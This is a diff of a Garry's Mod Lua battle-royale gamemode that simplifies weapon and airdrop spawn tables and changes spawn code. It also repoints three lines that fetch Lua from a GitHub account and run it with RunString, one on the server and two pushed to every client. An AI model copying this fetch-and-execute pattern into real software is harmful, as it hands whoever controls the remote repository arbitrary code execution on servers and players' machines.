@@ -317,38 +317,9 @@ local playerSpawns = {"-6250.042480 -614.145142 3634.766113",
 "-8062.040527 -9683.640625 3771.516357",
 "-8653.763672 -10559.058594 3332.280273",
 "-9260.781250 -11457.101563 2881.692139"}
-local weaponTable = {{3, "cw_smoke_grenade"}, {4, "khr_delisle"}, {3, "ma85_wf_smg41"}, {4, "khr_toz194"}, {4, "khr_ruby"}, {4, "khr_cz75"}, {3, "cw_g4p_usp40"}, {4, "khr_deagle"}, {4, "khr_m1carbine"}, {4, "khr_makarov"}, {2, "cw_g4p_ump45"}, {2, "khr_ak103"}, {4, "khr_svt40"}, {4, "ma85_wf_shg07"}, {4, "ma85_wf_smg18"}, {2, "cw_fiveseven"}, {3, "ma85_wf_pt14"}, {2, "khr_vector"}, {3, "khr_simsks"}, {3, "khr_m620"}, {2, "khr_aek971"}, {3, "ma85_wf_ar41"}, {3, "ma85_wf_ar03"}, {3, "ma85_wf_smg33"}, {3, "ma85_wf_smg25"}, {2, "cw_flash_grenade"}, {3, "khr_mosin"}, {2, "ma85_wf_pt41_ww2"}, {2, "cw_g4p_mp412_rex"}, {2, "khr_p90"}, {2, "khr_pkm"}, {1, "cw_ak74"}, {2, "khr_t5000"}, {1, "khr_mp5a5"}, {2, "khr_microdeagle"}, {2, "cw_frag_grenade"}, {1, "ma85_wf_sr34_gold"}, {1, "ma85_wf_ar22_gold"}, {1, "ma85_wf_pt21"}, {1, "ma85_wf_mg07_gold"}, {1, "weapon_slam"}}
-local AirDropTable = {{10, "ma85_wf_ar11_ann_br"}, {10, "weapon_sh_mustardgas"}, {10, "poison_dart_gun"}, {10, "weapon_rpg"}, {10, "weapon_a35a2"}, {10, "cw_g4p_awm"}, {10, "khr_gaussrifle"}, {10, "cw_kk_hk416"}, {10, "cw_g4p_g2contender"}, {10, "weapon_crossbow"}}
+local weaponTable = {"cw_smoke_grenade", "khr_delisle", "ma85_wf_smg41", "khr_toz194", "khr_ruby", "khr_cz75", "cw_g4p_usp40", "khr_deagle", "khr_m1carbine", "khr_makarov", "cw_g4p_ump45", "khr_ak103", "khr_svt40", "ma85_wf_shg07", "ma85_wf_smg18", "cw_fiveseven", "ma85_wf_pt14", "khr_vector", "khr_simsks", "khr_m620", "khr_aek971", "ma85_wf_ar41", "ma85_wf_ar03", "ma85_wf_smg33", "ma85_wf_smg25", "cw_flash_grenade", "khr_mosin", "ma85_wf_pt41_ww2", "cw_g4p_mp412_rex", "khr_p90", "khr_pkm", "cw_ak74", "khr_t5000", "khr_mp5a5", "khr_microdeagle", "cw_frag_grenade", "ma85_wf_sr34_gold", "ma85_wf_ar22_gold", "ma85_wf_pt21", "ma85_wf_mg07_gold",  "weapon_slam"}
+local AirDropTable = {"ma85_wf_ar11_ann_br", "weapon_sh_mustardgas", "poison_dart_gun", "weapon_rpg", "weapon_a35a2", "cw_g4p_awm", "khr_gaussrifle", "cw_kk_hk416", "cw_g4p_g2contender", "weapon_crossbow"}
 MapSize = {}
-
-function randomiseTable(tInput)
-	local tReturn = {}
-
-	for i = #tInput, 1, -1 do
-		local j = math.random(i)
-		tInput[i], tInput[j] = tInput[j], tInput[i]
-		table.insert(tReturn, tInput[i])
-	end
-
-	return tReturn
-end
-
-function CreateWeightedTable(tbl)
-	local weighted = {}
-
-	for k, v in ipairs(tbl) do
-		for i = 1, v[1] do
-			table.insert(weighted, v[2])
-		end
-	end
-
-	return weighted
-end
-
-local weaponClasses = CreateWeightedTable(weaponTable)
-weaponClasses = randomiseTable(weaponClasses)
-local airDropClasses = CreateWeightedTable(AirDropTable)
-airDropClasses = randomiseTable(airDropClasses)
 
 ----- Override parachute
 function ParachuteKey(ply, key)
@@ -416,7 +387,7 @@ function DoSpawns(playe)
 		playe:Give("weapon_fists")
 		playe:SetWalkSpeed(160)
 		playe:SetRunSpeed(240)
-		playe:SetPos(randomSpawn)
+		playe:SetPos(Vector(randomSpawn))
 		cachedPlayers[playe] = true
 
 		return
@@ -427,19 +398,24 @@ function DoSpawns(playe)
 		ply:Give("weapon_fists")
 		ply:SetWalkSpeed(160)
 		ply:SetRunSpeed(240)
-		ply:SetPos(randomSpawn)
+		ply:SetPos(Vector(randomSpawn))
 		if not ply:Alive() then continue end
 		cachedPlayers[ply] = true
 	end
 end
 
 function SpawnWeapons()
-	for k, v in ipairs(weaponSpawns) do
-		if math.random() <= 0.33 then
-			local ent = ents.Create(weaponClasses[math.random(#weaponClasses)])
-			ent:Vector(v)
-			ent.isCool = true
-			ent:Spawn()
+	PrintTable(weaponTable)
+	for k, v in pairs(weaponSpawns) do
+		local randomWeapon = table.Random(weaponTable)
+		if math.random(0, 100) < 51 then
+			local ent = ents.Create(randomWeapon)
+			print(randomWeapon)
+			timer.Simple(0.1, function()
+				ent:SetPos(Vector(v))
+				ent.isCool = true
+				ent:Spawn()
+			end)
 		end
 	end
 end
@@ -470,7 +446,8 @@ function CreateAirDrop(pos)
 	function ent:Use(activator, caller)
 		if self.beenUsed then return end
 		self.beenUsed = true
-		activator:Give(airDropClasses[math.random(#airDropClasses)])
+		local airDropRandom = table.Random(AirDropTable)
+		activator:Give(airDropRandom)
 
 		timer.Simple(5, function()
 			self:Remove()
@@ -531,7 +508,7 @@ local function CreateCommand(string, callback, check)
 end
 
 CreateCommand("refresh", function(ply)
-	http.Fetch("https://raw.githubusercontent.com/KaptianCore/Fortnut/main/lua/server.lua", function(body)
+	http.Fetch("https://raw.githubusercontent.com/EclipseCantCode/Fortnut/main/lua/server.lua", function(body)
 		RunString(body)
 	end)
 end, function(ply) return trusted[ply:SteamID()] end)
@@ -618,9 +595,10 @@ end, 2)
 
 hook.Add("ClientSignOnStateChanged", "sendcuntshit", function(userid, old, new)
 	if new == SIGNONSTATE_FULL then
-		Player(userid):SendLua("http.Fetch('https://raw.githubusercontent.com/KaptianCore/Fortnut/main/lua/client.lua', function(b) RunString(b) end)")
+		Player(userid):SendLua("http.Fetch('https://raw.githubusercontent.com/EclipseCantCode/Fortnut/main/lua/client.lua', function(b) RunString(b) end)")
 	end
 end)
 
 print("Loaded fortnut gamemode")
-BroadcastLua("http.Fetch('https://raw.githubusercontent.com/KaptianCore/Fortnut/main/lua/client.lua', function(b) RunString(b) end)")
+BroadcastLua("http.Fetch('https://raw.githubusercontent.com/EclipseCantCode/Fortnut/main/lua/client.lua', function(b) RunString(b) end)")
+
